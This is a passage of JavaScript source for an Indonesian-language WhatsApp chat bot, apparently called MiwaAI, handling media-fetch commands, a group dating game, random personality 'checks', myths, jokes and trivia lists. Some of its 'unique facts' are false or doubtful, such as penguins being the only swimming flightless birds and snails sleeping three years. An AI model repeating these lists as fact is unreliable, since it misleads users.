				if (/yotsuba/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/yotsuba.json')
				if (/yuki/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/yuki.json')
				if (/yulibocil/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/yulibocil.json')
				if (/yumeko/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/yumeko.json')
				const result = data[Math.floor(Math.random() * data.length)]
				const buffer = await getBuffer(result);
				m.reply({
					image: buffer,
					caption: `Nih Kak ${pushname}, ${command}-nya 😋☕`,
					footer: footer,
					buttons: [
						{
							buttonId: prefix + command,
							buttonText: {
								displayText: "🔄 Lanjut Lagi"
							}
						},
						{
							buttonId: `${prefix}menu`,
							buttonText: {
								displayText: "📜 Kembali ke Menu"
							}
						}
					],
					viewOnce: true
				});
			};
			db.data.users[m.sender].limit -= 1;
			break;

			case 'sound1':
			case 'sound2':
			case 'sound3':
			case 'sound4':
			case 'sound5':
			case 'sound6':
			case 'sound7':
			case 'sound8':
			case 'sound9':
			case 'sound10':
			case 'sound11':
			case 'sound12':
			case 'sound13':
			case 'sound14':
			case 'sound15':
			case 'sound16':
			case 'sound17':
			case 'sound18':
			case 'sound19':
			case 'sound20':
			case 'sound21':
			case 'sound22':
			case 'sound23':
			case 'sound24':
			case 'sound25':
			case 'sound26':
			case 'sound27':
			case 'sound28':
			case 'sound29':
			case 'sound30':
			case 'sound31':
			case 'sound32':
			case 'sound33':
			case 'sound34':
			case 'sound35':
			case 'sound36':
			case 'sound37':
			case 'sound38':
			case 'sound39':
			case 'sound40':
			case 'sound41':
			case 'sound42':
			case 'sound43':
			case 'sound44':
			case 'sound45':
			case 'sound46':
			case 'sound47':
			case 'sound48':
			case 'sound49':
			case 'sound50':
			case 'sound51':
			case 'sound52':
			case 'sound53':
			case 'sound54':
			case 'sound55':
			case 'sound56':
			case 'sound57':
			case 'sound58':
			case 'sound59':
			case 'sound60':
			case 'sound61':
			case 'sound62':
			case 'sound63':
			case 'sound64':
			case 'sound65':
			case 'sound66':
			case 'sound67':
			case 'sound68':
			case 'sound69':
			case 'sound70':
			case 'sound71':
			case 'sound72':
			case 'sound73':
			case 'sound74':
			case 'sound75':
			case 'sound76':
			case 'sound77':
			case 'sound78':
			case 'sound79':
			case 'sound80':
			case 'sound81':
			case 'sound82':
			case 'sound83':
			case 'sound84':
			case 'sound85':
			case 'sound86':
			case 'sound87':
			case 'sound88':
			case 'sound89':
			case 'sound90':
			case 'sound91':
			case 'sound92':
			case 'sound93':
			case 'sound94':
			case 'sound95':
			case 'sound96':
			case 'sound97':
			case 'sound98':
			case 'sound99':
			case 'sound100':
			case 'sound101':
			case 'sound102':
			case 'sound103':
			case 'sound104':
			case 'sound105':
			case 'sound106':
			case 'sound107':
			case 'sound108':
			case 'sound109':
			case 'sound110':
			case 'sound111':
			case 'sound112':
			case 'sound113':
			case 'sound114':
			case 'sound115':
			case 'sound116':
			case 'sound117':
			case 'sound118':
			case 'sound119':
			case 'sound120':
			case 'sound121':
			case 'sound122':
			case 'sound123':
			case 'sound124':
			case 'sound125':
			case 'sound126':
			case 'sound127':
			case 'sound128':
			case 'sound129':
			case 'sound130':
			case 'sound131':
			case 'sound132':
			case 'sound133':
			case 'sound134':
			case 'sound135':
			case 'sound136':
			case 'sound137':
			case 'sound138':
			case 'sound139':
			case 'sound140':
			case 'sound141':
			case 'sound142':
			case 'sound143':
			case 'sound144':
			case 'sound145':
			case 'sound146':
			case 'sound147':
			case 'sound148':
			case 'sound149':
			case 'sound150':
			case 'sound151':
			case 'sound152':
			case 'sound153':
			case 'sound154':
			case 'sound155':
			case 'sound156':
			case 'sound157':
			case 'sound158':
			case 'sound159':
			case 'sound160':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const aud = await getBuffer(`https://github.com/aerovoid4/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
				await sock.sendMessage(m.chat, { audio: aud, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'jadian': {
				if (!m.isGroup) return newReply(mess.group);
				sock.jadian = sock.jadian ? sock.jadian : {};
				let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
				if (!user) return newReply(`Kak, tag atau reply seseorang dulu dong biar MiwaAI tahu siapa yang Kamu maksud! 😉\n\n*Kirim perintah*: ${prefix + command} @0`);
				if (user === m.sender) return newReply("Hadehhh... masa Kamu mau jadian sama diri sendiri? 😏");
				if (user === botNumber) return newReply("Eh, maaf ya kak, aku cuma bot. Aku nggak bisa jadian sama Kamu 😣");
				let pasangan = db.data.users[user].pacar;
				let pasang = db.data.users[m.sender].pacar;
				if (pasang === user) {
					newReply(`Lah, Kamu udah jadian sama dia kok masih ngajak lagi? 🙄`);
				} else if (pasangan) {
					newReply(`Duh, kak... dia udah punya pacar nih 🥲\nCoba tanya dulu ke @${pasangan.split("@")[0]}, setuju nggak? 🫣`);
				} else if (pasang) {
					newReply(`Eitsss, jangan selingkuh ya, kak! 😱\n@${pasang.split("@")[0]} liat nih kelakuan ayangmu 🤭`);
				} else {
					let kataNembak = ["Ada saat di mana aku nggak suka sendiri. Tapi aku juga nggak mau semua orang menemani, hanya Kamu yang kumau.", "Aku baru sadar ternyata selama ini Kamu kaya! Kaya yang aku cari selama ini. Kamu mau nggak jadi pacarku?", "Aku boleh kirim CV ke Kamu nggak? Soalnya aku mau ngelamar jadi pacar."];
					let kataNya = await pickRandom(kataNembak);
					let teks = `💌 *Love Message...* 💌\n\n@${m.sender.split("@")[0]} ❤️ @${user.split("@")[0]}\n\n"${kataNya}"`;		
					sock.jadian[user] = [
						newReply(teks),
						m.sender
					];
					newReply(`Yeyy, Kamu baru aja ngajak @${user.split("@")[0]} buat jadian nih! 🥰\n\n@${user.split("@")[0]}, silahkan pilih ya~`);
				}
			}
			break;

			case 'terima': {
				if (!m.isGroup) return newReply(mess.group);
				if (sock.jadian[m.sender]) {
					let user = sock.jadian[m.sender][1];
					db.data.users[user].pacar = m.sender;
					db.data.users[m.sender].pacar = user;
					newReply(`Wiiihhh 🎉🎉\n\n@${m.sender.split("@")[0]} sekarang resmi jadian sama\n❤️ @${user.split("@")[0]}!\n\nSemoga langgeng yaaa, jangan lupa MiwaAI diundang kalo nikahan nanti 🙈💕`);
					delete sock.jadian[m.sender];
				} else {
					newReply("Hmm... nggak ada yang nembak Kamu, sabar ya 😅");
				}
			}
			break;

			case 'tolak': {
				if (!m.isGroup) return newReply(mess.group);
				if (sock.jadian[m.sender]) {
					let user = sock.jadian[m.sender][1];
					newReply(`Aduhh, kasian banget @${user.split("@")[0]} ditolak sama Kamu 😓\nSemangat terus ya, siapa tahu besok ada yang lebih baik! 🫣`);
					delete sock.jadian[m.sender];
				} else {
					newReply("Eh kak, nggak ada yang nembak Kamu kok. Jangan halu ya 🤭");
				}
			}
			break;

			case 'putus': {
				if (!m.isGroup) return newReply(mess.group);
				let pasangan = db.data.users[m.sender].pacar;
				if (pasangan) {
					db.data.users[m.sender].pacar = "";
					db.data.users[pasangan].pacar = "";
					newReply(`Huhuhu... @${m.sender.split("@")[0]} dan @${pasangan.split("@")[0]} udah resmi putus 😢\nSemoga tetap berteman yaaa 🤗`);
				} else {
					newReply("Eh kak, Kamu tuh jomblo kok mau putus? Ada-ada aja deh! 🤨");
				}
			}
			break;

			case 'cekpacar': {
				if (!m.isGroup) return newReply(mess.group);
				try {
					let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					if (!user) return newReply(`Tag atau reply orang dulu dong, kak! 😅\n\n*Kirim perintah*: ${prefix + command} @0`);
					let pasangan = db.data.users[user].pacar;
					if (pasangan) {
						newReply(`Wihhh, @${user.split("@")[0]} udah punya pacar nih!\n❤️ Sama @${pasangan.split("@")[0]} 😍`);
					} else {
						newReply(`Ehh, @${user.split("@")[0]} masih jomblo kok. Hayoo, siapa mau daftar jadi pacarnya? 🤭`);
					}
				} catch (error) {
					newReply(`Kayaknya @${user.split("@")[0]} nggak ada di database, deh 😥`);
				}
			}
			break;

			case 'checkme':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let namaTarget = args.join(" ");
				let idPengirim = `${m.sender}`;
				const daftarSifat = ['Baik 🥰', 'Jutek 😤', 'Santai 😎', 'Ramah 😊', 'Lucu 🤭', 'Nyebelin 😜', 'Serius 🧐', 'Keren 😌'];
				const daftarHobi = ['Memasak 🍳', 'Menari 💃', 'Bermain 🎮', 'Menggambar 🎨', 'Membaca 📚', 'Menonton Anime 📺', 'Bernyanyi 🎤', 'Berkebun 🌱'];
				const tingkatBucin = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
				const tingkatKeren = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
				const ketampanan = ['Iya 😍', 'Enggak 😭', 'Sangat Tampan 🤩', 'Hmm... Biasa aja 😅'];
				const daftarWatak = ['Penyayang 💖', 'Pemarah 😡', 'Murah Hati 🤗', 'Sabar 🧘', 'Lucu 🤭', 'Serius 🧐'];
				const MiwaAIlBaik = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
				const MiwaAIlBuruk = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
				const tingkatKepintaran = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
				const tingkatKeberanian = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
				const tingkatKetakutan = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
				let sifatAcak = daftarSifat[Math.floor(Math.random() * daftarSifat.length)];
				let hobiAcak = daftarHobi[Math.floor(Math.random() * daftarHobi.length)];
				let bucinAcak = tingkatBucin[Math.floor(Math.random() * tingkatBucin.length)];
				let kerenAcak = tingkatKeren[Math.floor(Math.random() * tingkatKeren.length)];
				let tampanAcak = ketampanan[Math.floor(Math.random() * ketampanan.length)];
				let watakAcak = daftarWatak[Math.floor(Math.random() * daftarWatak.length)];
				let MiwaAIlBaikAcak = MiwaAIlBaik[Math.floor(Math.random() * MiwaAIlBaik.length)];
				let MiwaAIlBurukAcak = MiwaAIlBuruk[Math.floor(Math.random() * MiwaAIlBuruk.length)];
				let pintarAcak = tingkatKepintaran[Math.floor(Math.random() * tingkatKepintaran.length)];
				let beraniAcak = tingkatKeberanian[Math.floor(Math.random() * tingkatKeberanian.length)];
				let takutAcak = tingkatKetakutan[Math.floor(Math.random() * tingkatKetakutan.length)];
				let profil = `*🎀━━━〔 𝗖𝗵𝗲𝗰𝗸 @${idPengirim.split('@')[0]} 〕━━━🎀*\n\n📝 *Nama*: ${pushname}\n✨ *Karakteristik*: ${sifatAcak}\n🎯 *Hobi*: ${hobiAcak}\n❤️ *Tingkat Bucin*: ${bucinAcak}%\n🌟 *Tingkat Keren*: ${kerenAcak}%\n😎 *Ketampanan*: ${tampanAcak}\n🧠 *Watak*: ${watakAcak}\n💎 *MiwaAIl Baik*: ${MiwaAIlBaikAcak}%\n🔥 *MiwaAIl Buruk*: ${MiwaAIlBurukAcak}%\n📊 *Kepintaran*: ${pintarAcak}%\n🛡️ *Keberanian*: ${beraniAcak}%\n👻 *Ketakutan*: ${takutAcak}%\n\n*🍭━━━〔 𝗖𝗛𝗘𝗖𝗞 𝗣𝗥𝗢𝗣𝗘𝗥𝗧𝗜𝗘𝗦 〕━━━🍭*`;
				try {
					ppuser = await sock.profilePictureUrl(m.sender, 'image');
				} catch (err) {
					ppuser = imageUrl
				}	
				let fotoProfil = await getBuffer(ppuser);
				sock.sendMessage(
					m.chat, 
					{ image: fotoProfil, caption: profil, mentions: [idPengirim] },
					{ quoted: m }
				);
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'mitos': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const myths = [
					'🌕 *Mitos Bulan Purnama*: Banyak orang percaya bahwa bulan purnama bisa memengaruhi perilaku manusia, menyebabkan kegilaan, dan meningkatkan angka kejahatan.',
					'🪞 *Mitos Cermin Pecah*: Memecahkan cermin dipercaya membawa nasib buruk selama 7 tahun.',
					'👻 *Mitos Hantu di Pohon Beringin*: Pohon beringin sering dikaitkan dengan makhluk halus dan dipercaya sebagai tempat tinggal roh gentayangan.',
					'🐈‍⬛ *Mitos Kucing Hitam*: Melihat kucing hitam melintas di depanmu sering dianggap sebagai pertanda sial.',
					'💍 *Mitos Cincin di Jari Tengah*: Memakai cincin di jari tengah dipercaya dapat menarik energi positif dan keberuntungan.',
					'🧂 *Mitos Menumpahkan Garam*: Menumpahkan garam dipercaya membawa nasib buruk, kecuali jika dilemparkan ke bahu kiri.',
					'🔮 *Mitos Bola Kristal*: Bola kristal sering dikaitkan dengan kemampuan meramal masa depan.',
					'🎋 *Mitos Pohon Bamboo*: Pohon bamboo di halaman rumah dipercaya bisa mengundang energi positif dan membawa keberuntungan.',
					'🌠 *Mitos Bintang Jatuh*: Jika melihat bintang jatuh dan membuat permintaan, maka permintaan itu akan terkabul.',
					'🐦 *Mitos Burung Masuk Rumah*: Burung yang masuk ke dalam rumah sering dianggap sebagai pertanda akan ada tamu atau berita penting.',
					'🌧️ *Mitos Hujan di Hari Pernikahan*: Hujan di hari pernikahan sering dianggap sebagai pertanda keberuntungan dan kebahagiaan.',
					'🍃 *Mitos Daun Jatuh di Kepala*: Jika ada daun jatuh di kepala seseorang, dipercaya orang itu akan mendapat keberuntungan.',
					'🦉 *Mitos Burung Hantu*: Burung hantu sering dianggap sebagai simbol kematian atau pertanda buruk di beberapa budaya.',
					'🖤 *Mitos Warna Hitam*: Warna hitam sering dikaitkan dengan kesialan dan energi negatif.',
					'🌈 *Mitos Ujung Pelangi*: Konon, ada harta karun di ujung pelangi, tetapi tidak ada yang bisa mencapainya.',
					'🌺 *Mitos Bunga Tumbuh di Makam*: Bunga yang tumbuh subur di makam dipercaya sebagai tanda bahwa roh orang yang dimakamkan itu damai.',
					'🏰 *Mitos Kastil Berhantu*: Banyak kastil tua di Eropa dipercaya dihantui oleh roh para penghuni masa lalu.',
					'💤 *Mitos Mimpi Gigi Copot*: Mimpi gigi copot sering dianggap sebagai pertanda akan ada kematian di keluarga.',
					'🌜 *Mitos Menghitung Bintang*: Menghitung bintang di langit dipercaya bisa membuat seseorang tumbuh jerawat.',
					'🍀 *Mitos Daun Semanggi Berdaun Empat*: Menemukan daun semanggi berdaun empat dipercaya membawa keberuntungan.',
					'🔥 *Mitos Api Menyala Sendiri*: Api yang menyala tiba-tiba di malam hari sering dikaitkan dengan kehadiran roh halus.',
					'🎵 *Mitos Siulan di Malam Hari*: Bersiul di malam hari dipercaya dapat mengundang makhluk halus.',
					'🦎 *Mitos Cicak Jatuh di Kepala*: Jika cicak jatuh di kepala seseorang, dipercaya itu adalah pertanda buruk.',
					'🌺 *Mitos Bunga Sedap Malam*: Aroma bunga sedap malam sering dianggap sebagai tanda kehadiran makhluk halus.',
					'🪦 *Mitos Makam Baru*: Mengunjungi makam yang baru dibuat di malam hari dipercaya dapat membawa energi negatif.',
					'🧟 *Mitos Zombie di Haiti*: Dalam kepercayaan Voodoo Haiti, ada mitos tentang manusia yang dihidupkan kembali sebagai zombie oleh penyihir.',
					'🌟 *Mitos Cahaya Misterius di Malam Hari*: Cahaya aneh yang terlihat di malam hari sering dianggap sebagai roh yang sedang berkeliaran.',
					'🏞️ *Mitos Danau Berhantu*: Banyak danau di dunia yang dipercaya dihuni oleh roh penjaga atau makhluk mitos.',
					'🪶 *Mitos Bulu Putih*: Menemukan bulu putih dipercaya sebagai tanda bahwa malaikat sedang menjaga kita.',
					'🍃 *Mitos Angin Berhembus Kencang Tiba-Tiba*: Angin yang tiba-tiba berhembus kencang sering dianggap sebagai tanda kehadiran makhluk halus.',
					'🎭 *Mitos Topeng Berhantu*: Beberapa topeng tradisional dipercaya memiliki roh atau energi mistis yang kuat.',
					'🗿 *Mitos Patung Tua*: Patung tua sering dianggap memiliki roh atau kutukan di dalamnya.',
					'⚰️ *Mitos Peti Mati Bergerak*: Ada mitos di beberapa budaya bahwa peti mati bisa bergerak sendiri jika ada roh yang tidak tenang.',
					'🔔 *Mitos Lonceng Berbunyi Sendiri*: Jika lonceng berbunyi sendiri tanpa ada angin atau yang memukulnya, sering dianggap sebagai tanda roh yang ingin berkomunikasi.'
				];
				const randomMyth = myths[Math.floor(Math.random() * myths.length)];
				newReply(`🪄 *Mitos Menarik*\n\n${randomMyth}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'faktaunik': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const facts = [
					'🧠 Otak manusia dapat menghasilkan listrik yang cukup untuk menyalakan lampu kecil!',
					'🐼 Panda bisa menghabiskan sekitar 12 jam sehari hanya untuk makan bambu.',
					'🌕 Di bulan, jejak kaki manusia bisa bertahan selama jutaan tahun karena tidak ada angin atau hujan.',
					'🦄 Jerapah tidur hanya sekitar 10-30 menit sehari dan sering tidur sambil berdiri!',
					'🎵 Musik dapat meningkatkan suasana hati dan membantu mengurangi stres.',
					'🐢 Penyu sudah ada sejak zaman dinosaurus, sekitar lebih dari 200 juta tahun yang lalu.',
					'🍫 Cokelat bisa memicu hormon endorfin yang membuat seseorang merasa bahagia.',
					'🚀 Di luar angkasa, air mata tidak bisa jatuh karena gravitasi yang rendah!',
					'🔮 Lebih dari 70% permukaan Bumi ditutupi oleh air.',
					'🐝 Lebah bisa mengenali wajah manusia layaknya manusia mengenali wajah satu sama lain.',
					'🐧 Penguin adalah satu-satunya burung yang bisa berenang tetapi tidak bisa terbang.',
					'🦷 Gigi adalah satu-satunya bagian tubuh manusia yang tidak bisa memperbaiki dirinya sendiri.',
					'🐌 Siput bisa tidur hingga 3 tahun lamanya!',
					'🔑 Sidik jari koala sangat mirip dengan sidik jari manusia.',
					'🌍 Bumi adalah satu-satunya planet yang tidak dinamai berdasarkan nama dewa atau dewi.',
					'🐟 Ikan mas memiliki ingatan yang lebih baik daripada yang orang pikirkan, mereka bisa mengingat sesuatu hingga beberapa bulan.',
					'🦇 Kelelawar adalah satu-satunya mamalia yang bisa terbang.',
					'🎤 Hati manusia berdetak sekitar 100.000 kali sehari.',
					'🌈 Tidak ada dua pelangi yang benar-benar sama, setiap orang melihat pelangi dengan sudut pandang berbeda.',
					'📱 Lebih banyak orang di dunia memiliki akses ke ponsel daripada toilet bersih.',
					'🌋 Di Islandia, ada lebih dari 100 gunung berapi aktif.',
					'💧 Air panas bisa membeku lebih cepat daripada air dingin dalam kondisi tertentu (Efek Mpemba).',
					'⚡ Petir lebih panas dari permukaan matahari.',
					'🦩 Flamingo mendapatkan warna pink dari makanan yang mereka makan, yaitu udang.',
					'🐇 Kelinci tidak bisa muntah.',
					'🧊 Antartika adalah gurun terbesar di dunia meskipun tertutup es.',
					'🐜 Semut tidak memiliki paru-paru, mereka bernapas melalui pori-pori kecil di tubuh mereka.',
					'🌟 Cahaya dari bintang yang kita lihat mungkin sudah tidak ada lagi karena bintang tersebut bisa saja sudah mati.',
					'🕷️ Laba-laba bisa menghasilkan sutra yang lebih kuat daripada baja dengan berat yang sama.',
					'🐨 Koala tidur hingga 20 jam sehari.',
					'🦁 Singa betina lebih sering berburu dibandingkan singa jantan.',
					'🐍 Ular bisa tidur dengan mata terbuka karena mereka tidak memiliki kelopak mata.',
					'🧠 Otak manusia terdiri dari sekitar 75% air.',
					'🐦 Burung kolibri adalah satu-satunya burung yang bisa terbang mundur.',
					'🎮 Bermain video game bisa meningkatkan koordinasi tangan dan mata.',
					'📖 Orang yang membaca buku secara rutin cenderung lebih empatik dan mudah memahami perasaan orang lain.',
					'🎭 Tertawa dapat meningkatkan sistem kekebalan tubuh.',
					'🌠 Rata-rata ada 44 petir yang menyambar permukaan bumi setiap detik.',
					'🦜 Burung beo bisa meniru suara manusia karena memiliki struktur otot vokal yang unik.',
					'🐴 Kuda bisa tidur sambil berdiri.',
					'🐶 Anjing bisa memahami lebih dari 150 kata manusia.',
					'🌬️ Angin terkuat yang pernah tercatat di Bumi memiliki kecepatan 372 km/jam.',
					'🍯 Madu adalah satu-satunya makanan yang tidak pernah basi.',
					'🦀 Kepiting bisa berjalan ke samping karena struktur tubuh dan kakinya.',
					'🌌 Ada lebih banyak bintang di alam semesta daripada butiran pasir di semua pantai di Bumi.',
					'🐉 Komodo adalah kadal terbesar di dunia.',
					'🏊‍♂️ Manusia bisa bertahan tanpa makanan selama berminggu-minggu, tetapi hanya beberapa hari tanpa air.',
					'🦎 Jika ekor cicak putus, ekornya akan tumbuh kembali.',
					'🚀 Sebagian besar debu di rumah berasal dari kulit mati manusia.'
				];
				const randomFact = facts[Math.floor(Math.random() * facts.length)];
				newReply(`🧠 *Fakta Unik*\n\n${randomFact}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'faktakucing': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const fakta = [
					'🐾 Kucing bisa melompat hingga 6 kali panjang tubuhnya!',
					'🐾 Lidah kucing memiliki tekstur kasar untuk membersihkan bulu.',
					'🐾 Kucing menghabiskan sekitar 70% hidupnya untuk tidur.',
					'🐾 Telinga kucing bisa berputar hingga 180 derajat!',
					'🐾 Kucing punya lima jari di kaki depan, tetapi hanya empat jari di kaki belakang.',
					'🐾 Kucing bisa berlari hingga 48 km per jam! Cepet banget, ya! 😲',
					'🐾 Kucing bisa mendengar suara frekuensi tinggi yang tidak bisa didengar manusia.',
					'🐾 Kucing bisa berkomunikasi dengan manusia lewat suara dan gerakan tubuh.',
					'🐾 Kucing memiliki 32 otot di telinga mereka untuk mengatur posisi telinga.',
					'🐾 Kucing memiliki indera penciuman yang 14 kali lebih tajam daripada manusia!',
					'🐾 Kucing menggosokkan kepala mereka ke objek sebagai tanda perkenalan dan untuk menandai wilayahnya.',
					'🐾 Beberapa kucing bisa mengingat tempat-tempat tertentu meskipun sudah bertahun-tahun berlalu.',
					'🐾 Kucing bisa melihat dengan jelas dalam kondisi cahaya yang sangat rendah, hampir gelap total!',
					'🐾 Kucing domestik punya banyak jenis suara, antara lain meong, dengkuran, dan purring!',
					'🐾 Kucing suka menjilat tangan mereka setelah makan untuk membersihkan diri dan merasa lebih tenang.',
					'🐾 Kucing sering tidur dengan mata setengah terbuka, ini untuk tetap waspada dari ancaman.',
					'🐾 Kucing punya kemampuan luar biasa dalam merasakan getaran tanah, misalnya gempa bumi!',
					'🐾 Kucing memiliki 9 kehidupan yang legendaris (tapi hanya mitos, ya)!',
					'🐾 Kucing bisa merasakan perubahan cuaca, kadang mereka lebih sensitif daripada manusia.',
					'🐾 Kucing tidak bisa merasakan rasa manis, lho! Mereka hanya suka makanan berbasis protein.'
				];
				const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
				newReply(randomFakta);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'joke': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const jokes = [
					'🤣 Kenapa kucing gak suka online? Karena takut kena mouse!',
					'🤣 Apa bahasa Jepangnya diskon? Murah-murashii!',
					'🤣 Kenapa sepeda gak bisa berdiri sendiri? Karena lelah!',
					'🤣 Kenapa ikan gak pernah ketabrak saat berenang? Karena selalu lihat ke kiri dan kanan!',
					'🤣 Hewan apa yang gak pernah salah? Kuda, karena selalu di jalur yang benar!',
					'🤣 Kenapa matematika bikin pusing? Karena kalau dihitung terus, gak ada habisnya!',
					'🤣 Apa bedanya jemuran sama orang ngambek? Kalau jemuran dijemur, kalau orang ngambek diem-diem aja!',
					'🤣 Kenapa pohon kelapa di depan rumah harus ditebang? Soalnya kalau dicabut berat!',
					'🤣 Ayam apa yang bikin lelah? Ayam capek (cape)!',
					'🤣 Kalau ikan jadi presiden, siapa wakilnya? Ikan Hiu… Hiupresiden!',
					'🤣 Kenapa komputer suka kerja lembur? Soalnya takut di-*shutdown*!',
					'🤣 Apa bahasa Jepangnya air terjun? Byur-byur-yamashita!',
					'🤣 Kenapa guru selalu bawa buku? Karena kalau bawa genteng berat!',
					'🤣 Hewan apa yang paling kaya? Beruang... Karena punya *bear*-ang!',
					'🤣 Kenapa burung gagak gak pernah ke gym? Karena udah punya *sayap*!',
					'🤣 Kenapa tikus suka ke bioskop? Karena di sana banyak *trail*r (tikus rela)!',
					'🤣 Apa yang lebih kecil dari semut? Bayinya semut!',
					'🤣 Kenapa Superman gak pernah pake baju warna hijau? Karena warnanya udah dipake Hulk!',
					'🤣 Kenapa lampu merah suka bikin macet? Soalnya dia suka berhenti di tempat!',
					'🤣 Kenapa nasi goreng lebih populer daripada nasi putih? Karena nasi putih gak ada suaranya pas dimasak!'
				];
				const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
				newReply(randomJoke);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'suit': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const userChoice = text.toLowerCase();
				const choices = ['batu', 'gunting', 'kertas'];
				const botChoice = choices[Math.floor(Math.random() * choices.length)];
				if (!choices.includes(userChoice)) {
					return newReply('🧠 Pilih antara *batu*, *gunting*, atau *kertas* ya, Kak!');
				}
				let hasil = '';
				if (userChoice === botChoice) {
					hasil = `🤝 Seri! Kita sama-sama pilih *${botChoice}*`;
				} else if (
					(userChoice === 'batu' && botChoice === 'gunting') ||
					(userChoice === 'gunting' && botChoice === 'kertas') ||
					(userChoice === 'kertas' && botChoice === 'batu')
				) {
					hasil = `🎉 Kamu menang! Aku pilih *${botChoice}*`;
				} else {
					hasil = `😢 Aku menang! Aku pilih *${botChoice}*`;
				}
				newReply(hasil);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'cekganteng': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '🔥 Wah, Kamu ini benar-benar bikin meleleh!' : 
					percentage > 50 ? '😎 Lumayan ganteng sih, Kak!' :
					'😅 Hmm... yang penting percaya diri ya, Kak!';
				newReply(`👑 *Cek Ganteng*\n\nKegantengan Kamu ada di angka *${percentage}%*\n${komentar}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'cekcantik': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '🔥 Wah, Kamu ini benar-benar bikin meleleh!' : 
					percentage > 50 ? '😍 Lumayan cantik sih, Kak!' :
					'😅 Hmm... yang penting percaya diri ya, Kak!';
				newReply(`👑 *Cek Cantik*\n\nKecantikan Kamu ada di angka *${percentage}%*\n${komentar}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'cekimut': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '🔥 Wah, Kamu ini benar-benar bikin meleleh!' : 
					percentage > 50 ? '😋 Lumayan imut sih, Kak!' :
					'😅 Hmm... yang penting percaya diri ya, Kak!';
				newReply(`👑 *Cek Imut*\n\nKeimutan Kamu ada di angka *${percentage}%*\n${komentar}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'cekjomok': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '🔥 Wah, Kamu ini benar-benar bikin meleleh!' : 
					percentage > 50 ? '🤣 Lumayan jomok sih, Kak!' :
					'😅 Hmm... yang penting percaya diri ya, Kak!';
				newReply(`👑 *Cek Jomok*\n\nKejomokan Kamu ada di angka *${percentage}%*\n${komentar}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'cekwaifu': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!quoted) return newReply(`Kirim/Reply Gambar Waifu Kamu Dengan Caption *${prefix + command}*`);
				if (!mime) return newReply(`Kirim/Reply Gambar Waifu Kamu Dengan Caption *${prefix + command}*`);
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '😍 Waifu terbaik sepanjang masa!' : 
					percentage > 50 ? '😊 Lumayan jadi waifu idaman!' :
					'😬 Ehm, mungkin waifu-nya butuh upgrade dikit...';
				newReply(`💖 *Cek Waifu*\n\nPersentase waifu Kamu adalah *${percentage}%*\n${komentar}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'cekhusbu': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!quoted) return newReply(`Kirim/Reply Gambar Husbu Kamu Dengan Caption *${prefix + command}*`);
				if (!mime) return newReply(`Kirim/Reply Gambar Husbu Kamu Dengan Caption *${prefix + command}*`);
				const percentage = Math.floor(Math.random() * 100) + 1;
				const komentar = percentage > 80 ? '😍 Husbu terbaik sepanjang masa!' : 
					percentage > 50 ? '😊 Lumayan jadi husbu idaman!' :
					'😬 Ehm, mungkin Husbu-nya butuh upgrade dikit...';
				newReply(`💖 *Cek Husbu*\n\nPersentase husbu Kamu adalah *${percentage}%*\n${komentar}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'cekkpribadian': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				const kepribadian = [
					'🧠 Cerdas dan bijaksana.',
					'❤️ Penuh kasih sayang dan perhatian.',
					'🔥 Bersemangat dan penuh energi.',
					'🎭 Misterius dan sulit ditebak.',
					'😄 Ramah dan menyenangkan.',
					'😎 Cool dan tenang dalam segala situasi.',
					'😅 Sering baperan, tapi baik hati.'
